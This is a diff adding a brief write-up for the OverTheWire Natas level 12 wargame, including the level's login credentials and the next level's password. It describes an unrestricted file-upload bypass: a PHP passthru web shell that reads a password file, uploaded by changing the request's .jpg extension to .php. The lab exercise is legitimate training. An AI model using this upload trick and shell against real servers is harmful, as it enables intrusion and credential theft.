@@ -1,0 +1,13 @@
+URL: http://natas12.natas.labs.overthewire.org
+username: natas12
+password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+The uploaded file is not checked for extension. So upload php file with content
+<?php
+	echo passthru("cat /etc/natas_webpass/natas13");
+?>
+and intercept the request sent to the server and change .jpg to .php
+and view the response.
+
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
